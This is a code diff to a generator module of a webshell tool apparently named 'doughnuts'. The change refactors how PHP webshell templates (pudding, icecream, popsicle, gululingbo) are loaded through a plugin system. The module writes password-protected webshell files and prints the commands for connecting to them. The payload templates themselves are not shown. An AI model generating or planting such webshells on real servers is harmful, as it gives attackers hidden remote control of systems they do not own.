@@ -4,10 +4,12 @@ from os import path
 from string import ascii_letters, digits
 from random import sample, randint
 from webshell_template import pudding, icecream, popsicle, gululingbo
+from Myplugin import Platform
+
+TEMPLATE_PF = Platform("webshell_template", "get_php", True)
 
 
-type_dict = {1: "Pudding", 2: "Icecream", 3: "Popsicle", 4: "Gululingbo"}
-func_dict = {1: pudding.get_php, 2: icecream.get_php, 3: popsicle.get_php, 4: gululingbo.get_php}
+template_name_dict = {k: v for k, v in enumerate(TEMPLATE_PF.names(), 1)}
 keyword_dict = {"GET": 3, "POST": 4, "COOKIE": 5, "HEADER": 6}
 
 
@@ -16,7 +18,8 @@ def ranstr(num):
 
 
 def get_php(keyword: int = 4, passwd: str = "", salt: str = "", _type: int = 1):
-    return func_dict[_type](keyword, passwd, salt)
+    template_name = template_name_dict[_type]
+    return TEMPLATE_PF[template_name].get_php(keyword, passwd, salt)
 
 
 def outside_generate(file_path: str, keyword: str = "POST", passwd: str = "", salt: str = "", _type: int = 1):
@@ -29,29 +32,12 @@ def outside_generate(file_path: str, keyword: str = "POST", passwd: str = "", sa
 
 @alias(True, "gen", f="file_path", k="keyword", p="passwd", s="salt")
 def run(file_name: str, keyword: str = "POST", passwd: str = "", salt: str = "", _type: int = 1):
-    """
-    generate
-
-    Generate a webshell using doughnuts encoding (password and salt none is random).
-
-    keyword:
-      - GET
-      - POST
-      - COOKIE
-      - HEADER
-
-    _type:
-      - 1 : Pudding
-      - 2 : Icecream
-      - 3 : Popsicle
-      - 4 : Gululingbo
-    """
     raw_keyword = keyword.upper()
     if (raw_keyword not in keyword_dict):
         print(color.red("\nKeyword error\n"))
         return
     keyword = keyword_dict[raw_keyword]
-    if (_type not in type_dict):
+    if (_type not in template_name_dict):
         print(color.red("\nType error\n"))
         return
     passwd = str(passwd) if passwd else ranstr(randint(5, 8))
@@ -68,9 +54,24 @@ def run(file_name: str, keyword: str = "POST", passwd: str = "", salt: str = "",
     with open(file_real_path, "w+") as f:
         f.write(php)
     print(color.green(
-        f"\ngenerate {type_dict[_type]}'s php in {file_real_path}! enjoy it!"))
+        f"\ngenerate {template_name_dict[_type]}'s php in {file_real_path}! enjoy it!"))
     print(color.yellow("\nUsage:"))
     print(color.yellow(
         f"    Interactive interface    : connect url {raw_keyword} {passwd} doughnuts-{salt}"))
     print(color.yellow(
         f"    Non-Interactive interface: doughnuts connect url {raw_keyword} {passwd} doughnuts-{salt}\n"))
+
+
+run.__doc__ = """
+    generate
+
+    Generate a webshell using doughnuts encoding (password and salt none is random).
+
+    keyword:
+      - GET
+      - POST
+      - COOKIE
+      - HEADER
+
+    _type:
+""" + "\n".join("      - %s : %s" % (k, v) for k, v in template_name_dict.items()) + "\n"
